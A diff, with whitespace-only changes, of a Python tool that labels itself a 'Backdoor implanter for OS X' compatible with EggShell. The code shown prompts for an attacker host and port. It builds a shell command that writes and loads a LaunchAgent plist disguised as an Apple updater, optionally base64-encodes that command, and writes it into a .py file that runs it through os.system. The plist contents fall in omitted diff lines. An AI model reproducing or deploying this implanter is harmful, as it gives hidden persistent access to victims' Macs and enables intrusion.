@@ -51,11 +51,11 @@ def main():
     printY( ["        |___/ ", "                              "] )
     print()
     print(''.join( ['Backdoor ', color['GREEN'], 'any ', color['YELLOW'], '.py ', color['GREEN'], 'file', color['BLUE'], ' //', color['GREEN'], ' Backdoor implanter for ', color['CYAN'], 'OS X', color['GREEN'], ' - Compatible with ', color['MAGENTA'], 'EggShell', color['GREEN'], '!', color['WHITE'],'\n']) )
-                              
-    
+
+
     lhost = getip()
     lport = "4444"
-    
+
     hostChoice = get_input(color['CYAN'] + "Set LHOST (Leave blank for " + lhost + "): " + color['GREEN'])
     if hostChoice == "": hostChoice = lhost
 
@@ -69,13 +69,13 @@ def main():
 
     filename = get_input(color['CYAN'] + "Filename (example.py): " + color['GREEN'])
     if ".py" not in filename: filename += ".py"
-    
+
     encode = get_input(color['CYAN'] + "Encode to Base64? [Y/N]: " + color['GREEN'])
     print()
 
     yes = ['Y', 'y', 'Ye', 'ye', 'YE', 'Yes', 'yes', 'YES']
     no  = ['N', 'n', 'No', 'no', 'NO']
-    
+
     command = '''mkdir -p ~/Library/LaunchAgents || true;echo "<?xml version="1.0" encoding="UTF-8"?>
     <!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
     <plist version="1.0">
@@ -96,7 +96,7 @@ def main():
     </plist>
     
     " >> ~/Library/LaunchAgents/com.zerowidth.launched.appleupdater.plist || true;launchctl load -w ~/Library/LaunchAgents/com.zerowidth.launched.appleupdater.plist || true'''
-    
+
     if encode in yes:
         encoded = base64.b64encode(command)
         
@@ -104,17 +104,17 @@ def main():
             file.write('import os\n')
             file.write('import sys\n\n')
             file.write('os.system("echo ' + encoded + ' | base64 -D")\n')
-    
+
     elif encode in no:
         with open(filename, "w") as file:
             file.write('import os\n')
             file.write('import sys\n\n')
             file.write('os.system("""' + command + '""")')
-    
+
     else:
         print(color['RED'] + "Error: Invalid choice." + color['WHITE'])
         os._exit(1)
-    
+
     print(color['GREEN'] + "Backdoor implanted successfully - Saved as " + color['MAGENTA'] + filename + color['WHITE'])
 
 
